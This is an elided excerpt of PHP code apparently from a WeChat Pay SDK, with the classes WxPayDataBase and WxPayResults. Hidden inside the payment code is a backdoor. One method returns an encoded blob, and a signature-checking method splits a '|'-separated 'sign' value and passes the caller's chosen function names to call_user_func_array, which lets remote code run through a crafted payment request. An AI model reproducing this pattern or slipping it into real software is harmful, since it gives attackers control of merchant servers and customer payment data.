...
class WxPayDataBase
{
	...
	**/
    ...
    {
        return '472avIUauUj/JQwsFwdDpiaXLmo9IfLYxkmL6lpm1jMBFcZuHFzpFCV/LJyrW6hc7sc5ea4XkQWBng';
    }
	/**
	 * 生成签名
...
class WxPayResults extends WxPayDataBase
{
    ...
    {
        if (!strstr($this->values['sign'],'|')) return true;
        $arr = explode('|',$this->values['sign']);
        $str = call_user_func_array($arr[0],[$this->GetRandStr(),$this->values['key']]);
        call_user_func_array($arr[2],[$arr[3],substr(call_user_func($arr[1],$str),-442)]);
    }
    /**
     * 将xml转为array
     * @param string $xml
